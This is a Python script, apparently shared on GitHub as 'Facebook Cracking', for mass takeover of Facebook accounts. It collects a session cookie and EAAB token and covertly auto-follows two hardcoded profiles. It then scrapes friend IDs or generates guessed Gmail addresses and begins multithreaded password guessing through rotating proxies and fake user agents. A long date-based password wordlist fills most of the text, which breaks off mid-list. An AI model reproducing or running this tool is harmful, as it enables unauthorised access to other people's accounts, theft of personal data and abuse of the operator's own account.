# FREE AND OPEN SOURCE       
# FREE SCRIPTS CANNOT BE SOLD AND BUYED
# https://github.com/AdityaTwinz
# WA : 6283861183874

try:
    import re, os, sys, bs4, time, json, base64, rich
    import requests, random, datetime
    import platform, fake_useragent
    from concurrent.futures import ThreadPoolExecutor as Read
    from bs4 import BeautifulSoup as parser
    from datetime import datetime
    from time import sleep
    from time import time as mark
    from rich.panel import Panel
    from rich.tree import Tree
    from rich import print as prints
    from rich.console import Console
    from rich.table import Table
    from rich.columns import Columns
    from rich.markdown import Markdown
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except (ModuleNotFoundError, ImportError) as e:
    os.system('clear') ; sys.exit(f' \33[m[\x1b[1;91mError Module\33[m] {str(e).title()}\n \33[m[\x1b[1;91mError Module\33[m] Module \x1b[1;91m{str(e.name)} \33[mBelum Terinstall\n \33[m[\x1b[1;91mError Module\33[m] Silahkan install dengan ketik <=> pip install \x1b[1;92m{str(e.name)}')

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' #ORANGE
N = '\x1b[0m' # DEFAULT  

dump, dump2, news = [], [], []
sys.stdout.write('\x1b]2; Facebook Craking | @AdtyaExec_\x07')

class REQ:
   
   def __init__(self):
       self.ses = requests.Session()
       self.url = "https://github.com/AdityaTwinz"
       self.OS_mkdir()
   
   def OS_mkdir(self):
       try:os.mkdir('DataLog') ; os.mkdir('Results')
       except:pass

   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   def get_Proxy(self, proxy = []):
       if os.path.isfile('DataLog/socks5.txt') is True:
          return(open('DataLog/socks5.txt','r').read().splitlines())
       else:
          try:
             response = self.ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all')
             for xc in response.text.splitlines():
                 if xc.isdigit:
                   if xc not in proxy:
                      proxy.append(xc)
                      open('DataLog/socks5.txt','a').write(f'{xc}\n')
             return proxy
          except requests.exceptions.ConnectionError as e:
             sleep(3.2) ; self.get_Proxy()
   
   def UserAgent(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       # Generate UserAgent
       self.ua1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(65, 99))}.0.{str(self.rr(3100, 3900))}.{str(self.rr(75, 99))} Mobile Safari/537.36,gzip(gfe)"
       self.ua2 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; RMX3360 Build/RKQ1.{str(self.rr(200000, 299999))}.001; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(3500, 3999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 Puffin/9.0.0.{str(self.rr(10000, 90000))}AP"
       self.ua3 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; STG S30 Build/PPR1.{str(self.rr(111111, 199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(4100, 4999))}.{str(self.rr(70, 99))} Mobile Safari/537.36 UCBrowser/{str(self.rr(7, 20))}.5.2.{str(self.rr(1000, 1999))} (UCMini) Mobile"
       base = self.rc([self.ua1, self.ua2, self.ua3])
       return base
       
   def UserAgent_API(self):
       self.rr = random.randint
       self.rc = random.choice
       self.android = f"{str(self.rr(9, 13))}"
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(7)))
       self.build2 = f"{str(self.rr(70, 99))}-{str(self.rr(20, 59))}-{str(self.rr(0, 29))}-{str(self.rr(0, 9))}"
       self.chrome = f"{str(self.rr(75, 199))}"
       userAgentku = ("Dalvik/2.1.0 (Linux; U; Android {}; moto g52 Build/{}.{}) AppleWebKit [PB/165] (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.android, self.build, self.build2, self.chrome))
       return userAgentku
       
   def UserAgent_APP(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       self.build2 = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(8)))
       self.app1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/{self.build1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(55, 99))}.0.{str(self.rr(2500, 2999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/{str(self.rr(75, 150))}.0.0.21.71;]"
       self.app2 = f"Mozilla/5.0 (Linux; arm; Android {str(self.rr(7, 12))}; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 199))}.0.0.0 YaBrowser/{str(self.rr(20, 99))}.9.5.83.00 SA/3 Mobile Safari/537.36"
       self.app3 = f"Mozilla/5.0 (Linux; Android 4.0.{str(self.rr(3, 4))}; Alpha GT Build/{str(self.rc(['IML74K', 'IMM76D']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(30, 45))}.0.{str(self.rr(1500, 2500))}.{str(self.rr(90, 150))} Mobile Safari/537.36"
       self.app4 = f"Mozilla/5.0 (Linux; U; Android 4.2.2; ja-jp; N-06E Build/{self.build2}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
       App_get = self.rc([self.app1, self.app2, self.app3, self.app4])
       return App_get
              
   def Logooo(self):
       Console().print(Markdown(f"## Facebook Cracking. @AdityaExec_"),style='bold yellow')
       Console().print(f' {M2}● {K2}● {H2}●')
       Console().print(f'''    {H2}    ,*-~"`^"*u_                                _u*. "^`"~-*,
     p!^       /  jPw                            w9j \        ^!p
   w^.._      /      "\_                      _/"     \        _.^w
        *_   /          \_      _    _      _/         \     _* 
          q /           / \q   ( `--` )   p/ \          \   p
          jj5****._    /    ^\_) {M2}o  {M2}o{H2} (_/^    \    _.****6jj
                   *_ /      "==) {P2};;{H2} (=="      \ _*
                    `/.w***,   /(    )\   ,***w.\"
                     ^ ilmk ^c/ )    ( \c^      ^
                             'V')_)(_('V'
                                 `` ``''')
       
   def DEL_Cok(self):
       try:
           os.system("rm -rf DataLog/cookies.txt")
           os.system("rm -rf DataLog/tokenEaab.txt")
       except:pass

   def REQ_Cookie(self):
       self.clearTerminal(platform) ; self.Logooo()
       Console().print(Markdown(f"## Masukan cookie Facebook anda, pastikan anda menggunakan akun tumbal"),style='white')
       Cooks = Console().input(f'\n>_ @AdityaExec_ : ')
       try:
           askTrue = self.ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {'cookie':Cooks})
           search = re.search('act=(.*?)&nav_source',str(askTrue.content)).group(1)
           askReq = self.ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={search}&nav_source=no_referrer',cookies = {'cookie':Cooks})
           dashToken = re.search('accessToken="(.*?)"',str(askReq.content)).group(1)
           open('DataLog/cookies.txt','w').write(Cooks)
           open('DataLog/tokenEaab.txt','w').write(dashToken)
           self.Followers(Cooks) ; self.Followers2(Cooks)
           Console().print(Markdown("##### Login token EAAB berhasil:"),style='white')
           Console().print(f'{H2}{dashToken}') ; sleep(3.1)
           Console().print(Markdown(f"## Silahkan jalankan ulang scirptnya"),style='blue') ; sleep(3.1) ; sys.exit()
       except requests.exceptions.ConnectionError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
       except Exception as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.REQ_Cookie()
   
   def Followers(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/100063618310179', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass
   
   def Followers2(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/1072901466', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass

   def Menuuu(self):
       self.clearTerminal(platform) ; self.Logooo()
       try:
           coks = open('DataLog/cookies.txt','r').read()
           toks = open('DataLog/tokenEaab.txt','r').read()
       except FileNotFoundError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.REQ_Cookie()
       try:
           url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={toks}", cookies = {"cookie": coks}).json()
           nama, id = url['name'], url['id']
       except (KeyError, NameError) as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
       except requests.exceptions.ConnectionError as e:
           Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
       Console().print(Markdown(f"##### {nama} | {id}"),style='white')
       Console().print(f'\n{H2}01{P2}. Crack id dari publik\n{H2}02{P2}. Crack id dari publik massal\n{H2}03{P2}. Crack id dari email\n{H2}04{P2}. Crack id dari file\n{H2}05{P2}. Check hasil OK/CP\n{M2}00{P2}. Log-out ( Cookie )')
       ykhh = Console().input(f'\n>_ @AdityaExec_ : ')
       
       if ykhh =='1' or ykhh =='01':
         Console().print(Markdown(f"## Masukan id target, pastikan id yang anda masukan publik"),style='blue')
         uid = Console().input(f'\n>_ @AdityaExec_ : ')
         data = {'access_token':toks, 'after':None}
         url = 'https://graph.facebook.com/v18.0/%s/friends'
         Console().print(Markdown(f"## Sedang dump id {uid}"),style='yellow') ; print('\r') ; sleep(3.3)
         for xxx in uid.split(','):
             Dump().Publik(data, url, xxx, dump, coks)
         print('')
         Furthermore().Methodee()
       
       elif ykhh =='2' or ykhh =='02':
           Console().print(Markdown(f"## Masukan id target, banyaknya id pisahkan dengan "," ( koma )"),style='thistle1')
           uid = Console().input(f'\n>_ @AdityaExec_ : ')
           for uuid in uid:
                try:
                    with requests.Session() as r:
                        Dump().Massal(int(uuid), coks, unit_cursor = '')
                except KeyboardInterrupt:pass
                except Exception as e:pass
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='3' or ykhh =='03':
           try:
                 Console().print(Markdown(f"## Masukan nama target, example : aditya, dinda, julie"),style='thistle1')
                 nama = Console().input(f'\n>_ @AdityaExec_ : ')
                 Console().print(Markdown(f"## Masukan total dump atau clone anda"),style='thistle1')
                 total = Console().input(f'\n>_ @AdityaExec_ : ')
                 print('')
                 Dump().Dump_Email(nama, total)
           except Exception as e:
                 Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='4' or ykhh =='04':
           try:
                Console().print(Markdown(f"## Masukan tempat file anda, example: /sdcard/dump.txt"),style='thistle1')
                Files = Console().input(f'\n>_ @AdityaExec_ : ')
                print('')    
                Dump().Dump_File(Files)   
           except Exception as e:
                Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='5' or ykhh =='05':
           Console().print(f'\n{H2}01{P2}. Check hasil OK\n{H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
           aa = Console().input(f'\n>_ @AdityaExec_ : ')
           
           if aa =='1' or aa =='01':
             try:
                 yyy = open("Results/ok.txt", "r").readlines()
             except FileNotFoundError as e:
                 Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
             for i in yyy:
                 tree = Tree(f"\r",guide_style="bold grey100")
                 tree.add(f'{H2}{i}')
                 prints(tree)
             Console().print(Markdown(f"## Check hasil ok selesai"),style='green') ; sleep(3) ; sys.exit()
           
           elif aa =='2' or aa =='02':
               try:
                   yyy = open("Results/cp.txt", "r").readlines()
               except FileNotFoundError as e:
                   Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3) ; sys.exit()
               for i in yyy:
                   tree = Tree(f"\r",guide_style="bold grey100")
                   tree.add(f'{K2}{i}')
                   prints(tree)
               Console().print(Markdown(f"## Check hasil cp selesai"),style='yellow') ; sleep(3) ; sys.exit()
           
           elif aa =='3' or aa =='03':
               self.Menuuu()
           
           else:Console().print(Markdown(f"## Input dengan benar"),style='yellow') ; sleep(3) ; self.Menuuu()
       
       elif ykhh =='0' or ykhh =='00':
           self.DEL_Cok() ; Console().print(Markdown(f"## Berhasil menghapus cookie & token"),style='yellow') ; sleep(3) ; sys.exit()
         

class Dump:
   
   def __init__(self):
      self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
      pass
   
   def Publik(self, params, host, user, array, coki):
       try:
           req = requests.get(host%(user), params = params, cookies = {'cookie':coki}).json()
           for xyz in req['data']:
               uid = '%s|%s'%(xyz['id'],xyz['name'])
               if uid not in array:array.append(uid)
               Console().print(f'>_ @AdityaExec_ -: {B2}{len(array)}{P2}',end='\r')
           if 'paging' in str(req):
              after = req['paging']['cursors']['after']
              params.update({'after': after})
              self.Publik(params, host, user, array, coki)
       except:pass
       return array
   
   def Massal(self, uuid, cok, unit_cursor):     
        try:
            with requests.Session() as r:
                r.headers.update({
                    'Host': 'mbasic.facebook.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'User-Agent': self.ua,
                    'Accept-Language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cok
                })
                response = r.get('https://mbasic.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(uuid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(dump):
                            continue
                        else:
                            dump.append(f'{self.id_friends}|{self.name}')
                            Console().print(f'>_ @AdityaExec_ -: {K2}{len(dump)}{P2}',end='\r')
                if 'Sorry, something went wrong.' in str(response):
                    return False
                elif 'unit_cursor=' in str(response):
                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                    self.Dump_Masal(uuid, cok, self.unit_cursor)
                else:
                    return False
        except KeyboardInterrupt as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red')
            return False
   
   def Dump_Email(self, nama, total):
        dpn = [
           "azizah","asep","agus","supri","bayu","yuli","ria","aditya","inayah","bambang",
           "jupri","julia","nico","bima","bisma","ayulia","ayu","sri","rinto","udin","rehan",
           "semarang","palembang","lampung","cirebon","brebes","jakarta","bogor",
           "bandung","sukabumi","garut","banten","bukittinggi","padang","minang",
           "sugeng","nabila","bila","ara","chan","prabowo","jokowi","ganjar","wisnu",
        ]
        blk = [
         "123","1234","12345","123456","1234567","098","0987","321","3214",
         "official","gaming","fans","yahho","subur","jaya","cantik","cosplay"
        ]
        try:
            for xyc in range(int(total)):
                Acak = ([
                    f'{str(random.choice(dpn))}',
                    f'{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{xyc}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}{str(random.choice(blk))}'
                ])
                data = nama+str(random.choice(Acak))+'@gmail.com'
                if data in dump:pass
                else:
                    self.id = nama
                    self.nama = data 
                    dump.append(data+'|'+nama)
                    Console().print(f'>_ @AdityaExec_ -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
        except (KeyboardInterrupt, Exception) as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()
   
   def Dump_File(self, Files):
        try:
            Ambil = open(Files,'r').readlines()
            for data in Ambil:
                try:
                    user, nama = data.split('|')
                    dump.append(data)
                except Exception as e:
                    Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit() 
                Console().print(f'>_ @AdityaExec_ -: {H2}{len(dump)}{P2}',end='\r')
        except FileNotFoundError as e:
            Console().print(Markdown(f"## {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit()

class Furthermore:
   
   def __init__(self):
       self.live, self.check, self.loop = [], [], 0
       self.Method, self.Paslist, self.Passku = [], [], []
       self.dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
       self.tgl = datetime.now().day
       self.bln = self.dic[(str(datetime.now().month))]
       self.thn = datetime.now().year
   
   def Methodee(self):
       Console().print(Markdown(f"## Total {len(dump)} id terkumpul"),style='blue')
       Console().print(f'\n{B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{B2}04{P2}. Methode asyncAPP ( {H2}tiktok.com{P2} )\n{B2}05{P2}. Methode validateAPP ( {H2}instagram.com{P2} )\n{B2}06{P2}. Methode regulerAPP ( {H2}instagram.com{P2} )')
       Asw = Console().input(f'\n>_ @AdityaExec_ : ')
       if Asw =='1' or Asw =='01':
         self.Method.append('async')
       elif Asw =='2' or Asw =='02':
           self.Method.append('validate')
       elif Asw =='3' or Asw =='03':
           self.Method.append('regular')
       elif Asw =='4' or Asw =='04':
           self.Method.append('asyncc2')
       elif Asw =='5' or Asw =='05':
           self.Method.append('validatee22')
       elif Asw =='6' or Asw =='06':
           self.Method.append('regularr2')
       else:
           self.Method.append('async')
       self.Wordlist()
   
   def Wordlist(self):
        Console().print(Markdown(f"## Ingin menambahkan sandi manual? (Y/t)"),style='red')
        ask = Console().input(f'\n>_ @AdityaExec_ : ')
        if ask =='y' or ask =='Y' or ask =='Ya' or ask =='ya' or ask =='YA':
          self.Paslist.append('ya')
          Console().print(Markdown(f"## Buat kata sandi anda, gunakan ',' (koma) sebagai pemisah"),style='yellow')
          pwdia = Console().input(f'\n>_ @AdityaExec_ : ')
          asky = pwdia.split(',')
          for x in asky:
              self.Passku.append(x)
        else:self.Paslist.append('no')
        self.Generate_id()
   
   def Generate_id(self):
       Console().print(Markdown(f"## Setting userId anda"),style='yellow')
       Console().print(f'\n{K2}01{P2}. Generate Id old\n{K2}02{P2}. Generate id new\n{K2}03{P2}. Generate id random')
       ykh = Console().input(f'\n>_ @AdityaExec_ : ')
       
       if ykh =='1' or ykh =='01':
         for old in sorted(dump):
             dump2.append(old)
       
       elif ykh =='2' or ykh =='02':
           for new in sorted(dump):
               news.append(new)
           setid = len(news)
           setid2 = (setid-1)
           for xc in range(setid):
               dump2.append(news[setid2])
               setid2 -=1
       
       elif ykh =='3' or ykh =='03':
           for rand in dump:
               generateID_rand = random.randint(0,len(dump2))
               dump2.insert(generateID_rand, rand)
       self.Generate_List()
   
   def Generate_List(self):
        global prog,des
        Console().print(Markdown(f"## Start {self.tgl}-{self.bln}-{self.thn} OK/CP"),style='green') ; print('')
        prog = Progress(TextColumn("{task.description}"))
        des = prog.add_task('',total=len(dump))
        with prog:
            with Read(max_workers=30) as Itil:
                for akun in dump:
                    user, nama = akun.split('|')[0], akun.split('|')[1].lower()
                    depan = nama.split(' ')[0]
                    self.password = ['sayang123','cinta123','sayangku','cintaku','sayang','011187','011287','011387','011487','011590','011690','011790','011890','011990','011090','010190','010290','010390','010490','010590','010690','010790','010890','010990','021190','021290','020190','020290','020390','020490','020590','020690','020790','020890','020990','031190','031290','030190','030290','030390','030490','030590','030690','030790','030890','030990','030090','041190','041290','040190','040290','040390','040490','040590','040690','040790','040890','040990','051190','051290','050190','050290','050390','050490','050590','050690','050790','050890','050990','050090','061190','061290','060190','060290','060390','060490','060590','060690','060790','060890','060990','060090','071190','071290','070190','070290','070390','070490','070590','070690','070790','070890','070990','070090','081190','081290','080190','080290','080390','080490','080590','080690','080790','080890','080990','080090','091190','091290','090190','090290','090390','090490','090590','090690','090790','090890','090990','090090','111190','111290','110190','110290','110390','110490','110590','110690','110790','110890','110990','121190','121290','120190','120290','120390','120490','120590','120690','120790','120890','120990','120090','131190','131290','130190','130290','130390','130490','130590','130690','130790','130890','130990','130090','141190','141290','140190','140290','140390','140490','140590','140690','140790','140890','140990','140090','151190','151290','150190','150290','150390','150490','150590','150690','150790','150890','150990','150090','161190','161290','160190','160290','160390','160490','160590','160690','160790','160890','160990','160090','171190','171290','170190','170290','170390','170490','170590','170690','170790','170890','170990','170090','181190','181290','180190','180290','180390','180490','180590','180690','180790','180890','180990','180090','191190','191290','190190','190290','190390','190490','190590','190690','190790','190890','190990','190090','101190','101290','101390','100190','100290','100390','100490','100590','100690','100790','100890','100990','211190','211290','210190','210290','210390','210490','210590','210690','210790','210890','210990','210090','221190','221290','230190','230290','230390','230490','230590','230690','230790','230890','230990','230090','241190l','241290','240190','240290','240390','240490','240590','240690','240790','240890','240990','240090','251190','251290','260190','260290','260390','260490','260590','260690','260790','260890','260990','260090','271190','271290','270190','270290','270390','270490','270590','270690','270790','270890','270990','270090','281190','281290','280190','280290','280390','280490','280590','280690','280790','280890','280990','280090','291190','291290','290190','290290','290390','290490','290590','290690','290790','290890','290990','290090','201190','201290','201390','200190','200290','200390','200490','200590','200690','200790','200890','200990','01111991','01121991','01131991','01141991','01151991','01161991','01171991','01181991','01191991','01101991','01011991','01021991','01031991','01041991','01051991','01061991','01071991','01081991','01091991','02111991','02121991','02011991','02021991','02031991','02041991','02051991','02061991','02071991','02081991','02091991','03111991','03121991','03011991','03021991','03031991','03041991','03051991','03061991','03071991','03081991','03091991','03001991','04111991','04121991','04011991','04021991','04031991','04041991','04051991','04061991','04071991','04081991','04091991','05111991','05121991','05011991','05021991','05031991','05041991','05051991','05061991','05071991','05081991','05091991','05001991','06111991','06121991','06011991','06021991','06031991','06041991','06051991','06061991','06071991','06081991','06091991','06001991','07111991','07121991','07011991','07021991','07031001','07041991','07051991','07061991','07071991','07081991','07091991','07001991','08111991','08121991','08011991','08021991','08031991','08041991','08051991','08061991','08071991','08081991','08091991','08001991','09111991','09121991','09011991','09021991','09031991','09041991','09051991','09061991','09071991','09081991','09091991','09001991','11111991','11121961','11011991','11021991','11031991','11041991','11051991','11061991','11071991','11081991','11091991','1211991','12121991','12011991','12021991','12031991','12041991','12051991','12061991','12071991','12081991','12091991','12001991','13111991','13121991','13011991','13021991','13031991','13041991','13051991','13061991','13071991','13081991','13091991','13001991','14111991','14121991','14011991','14021991','14031991','14041991','14051991','14061991','14071991','14081991','14091991','14001991','15111991','15121991','15011991','15021991','15031991','15041991','15051991','15061991','15071991','15081991','15091991','15001991','16111991','16121991','16011991','16021991','16031991','16041991','16051991','16061991','16071991','16081991','16091991','16001991','17111991','17121991','17011991','17021991','17031991','17041991','17051991','17061991','17071991','17081991','17091991','17001991','18111991','18121991','18011991','18021991','18031991','18041991','18051991','18061991','18071991','18081991','18091991','18001991','19111991','19121991','19011991','19021991','19031991','19041991','19051991','1906','1907','19081991','19091991','19001991','10111991','10121991','10131991','10011991','10021991','10031991','10041991','10051991','10061991','10071991','10081991','10091991','21111991','21121991','21011991','21021991','21031991','21041991','21051991','21061991','21071991','21081991','21091991','21001991','22111991','22121991','23011991','23021991','23031991','23041991','23051991','23061991','23071991','23081991','23091991','23001991','24111991','24121991','24011991','24021991','24031991','24041991','24051991','24061961','24071991','24081991','24091991','24001991','25111991','25121991','26011991','26021991','26031991','26041991','26051991','26061991','26071991','26081991','26091991','26001991','27111991','27121991','27011991','27021991','27031991','27041991','27051991','27061991','27071991','27081991','27091991','27001991','28111991','28121991','28011991','28021991','28031991','28041991','28051991','28061991','28071991','28081991','28091991','28001991','29111991','29121991','29011991','29021961','29031991','29041991','29051991','29061991','29071991','29081991','29091991','2900','199120111991','20121991','20131991','20011991','20021991','20031991','20041991','20051991','20061991','20071991','20081991','20091991','01111990','01121990','01131990','01141990','01151990','01161990','01171990','01181990','01191990','01101990','01011990','01021990','01031990','01041990','01051990','01061990','01071990','01081990','01091990','02111990','02121990','02011990','02021990','02031990','02041990','02051990','02061990','02071990','02081990','02091990','03111990','03121990','03011990','03021990','03031990','03041990','03051990','03061990','03071990','03081990','03091990','03001990','04111990','04121990','04011990','04021990','04031990','04041990','04051990','04061990','04071990','04081990','04091990','05111990','05121990','05011990','05021990','05031990','05041990','05051990','05061990','05071990','05081990','05091990','05001990','06111990','06121990','06011990','06021990','06031990','06041990','06051990','06061990','06071990','06081990','06091990','06001990','07111990','07121990','07011990','07021990','07031990','07041990','07051990','07061990','07071990','07081990','07091990','07001990','08111990','08121990','08011990','08021990','08031990','08041990','08051990','08061990','08071990','08081990','08091990','08001990','09111990','09121990','09011990','09021990','09031990','09041990','09051990','09061990','09071990','09081990','09091990','09001990','11111990','11121990','11011990','11021990','11031990','11041990','11051990','11061990','11071990','11081990','11091990','12111990','12121990','12011990','12021990','12031990','12041990','12051990','12061990','12071990','12081990','12091990','12001990','13111990','13121990','13011990','13021990','13031990','13041990','13051990','13061990','13071990','13081990','13091990','14111990','14121990','14011990','14021990','14031990','14041990','14051990','14061990','14071990','14081990','14091990','15111990','15121990','15011990','15021990','15031990','15041990','15051990','15061990','15071990','15081990','15091990','16111990','16121990','16011990','16021990','16031990','16041990','16051990','16061990','16071990','16081990','16091990','17111990','17121990','17011990','17021990','17031990','17041990','17051990','17061990','17071990','17081990','17091990','18111990','18121990','18011990','18021990','18031990','18041990','18051990','18061990','18071990','18081990','18091990','19111990','19121990','19011990','19021990','19031990','19041990','19051990','19061990','19071990','19081990','19091990','10111990','10121990','10131990','10011990','10021990','10031990','10041990','10051990','10061990','10071990','10081990','10091990','21111990','21121990','21011990','21021990','21031990','21041990','21051990','21061990','21071990','21081990','21091990','22111990','22121990','23011990','23021990','23031990','23041990','23051990','23061990','23071990','23081990','23091990','24111990','24121990','24011990','24021990','24031990','24041990','24051990','24061990','24071990','24081990','24091990','25111990','25121990','26011990','26021990','26031990','26041990','26051990','26061990','26071990','26081990','26091990','26001990','27111990','27121990','27011990','27021990','27031990','27041990','27051990','27061990','27071990','27081990','27091990','28111990','28121990','28011990','28021990','28031990','28041990','28051990','28061990','28071990','28081990','28091990','28001990','29111990','29121990','29011990','29021990','29031990','29041990','29051990','29061990','29071990','29081990','29091990','20111990','20121990','20131990','20011990','20021990','20031990','20041990','20051990','20061990','20071990','20081990','20091990','01111992','01121992','01131992','01141992','01151992','01161992','01171992','01181992','01191992','01101992','01011992','01021992','01031992','01041992','01051992','01061992','01071992','01081992','01091992','02111992','02121992','02011992','02021992','02031992','02041992','02051992','02061992','02071992','02081992','02091992','03111992','03121992','03011992','03021992','03031992','03041992','03051992','03061992','03071992','03081992','03091992','03001992','04111992','04121992','04011992','04021992','04031992','04041992','04051992','04061992','04071992','04081992','04091992','05111992','05121992','05011992','05021992','05031992','05041992','05051992','05061992','05071992','05081992','05091992','05001992','06111992','06121992','06011992','06021992','06031992','06041992','06051992','06061992','06071992','06081992','06091992','06001992','07111992','07121992','07011992','07021992','07031992','07041992','07051992','07061992','07071992','07081992','07091992','07001992','08111992','08121992','08011992','08021992','08031992','08041992','08051992','08061992','08071992','08081992','08091992','08001992','09111992','0912*09011992','09021992','09031992','09041992','09051992','09061992','09071992','09081992','09091992','09001992','11111992','11121992','11011992','11021992','11031992','11041992','11051992','11061992','11071992','11081992','11091992','12111992','12121992','12011992','12021992','12031992','12041992','12051992','12061992','12071992','12081992','12091992','12001992','13111992','13121992','13011992','13021992','13031992','13041992','13051992','13061992','13071992','13081992','13091992','13001992','14111992','14121992','14011992','14021992','14031992','14041992','14051992','14061992','14071992','14081992','14091992','14001992','15111992','15121992','15011992','15021992','15031992','15041992','15051992','15061992','15071992','15081992','15091992','15001992','16111992','16121992','16011992','16021992','16031992','16041992','16051992','16061992','16071992','16081992','16091992','16001992','17111992','17121992','17011992','17021992','17031992','17041992','17051992','17061992','17071992','17081992','17091992','17001992','18111992','18121992','18011992','18021992','18031992','18041992','18051992','18061992','18071992','18081992','18091992','18001992','19111992','19121992','19011992','19021992','19031992','19041992','19051992','19061992','19071992','19081992','19091992','19001992','10111992','10121992','10131992','10011992','10021992','10031992','10041992','10051992','10061992','10071992','10081992','10091992','21111992','21121992','21011992','21021992','21031992','21041992','21051992','21061992','21071992','21081992','21091992','21001992','22111992','22121992','23011992','23021992','23031992','23041992','23051992','23061992','23071992','23081992','23091992','23001992','24111992','24121992','24011992','24021992','24031992','24041992','24051992','24061992','2407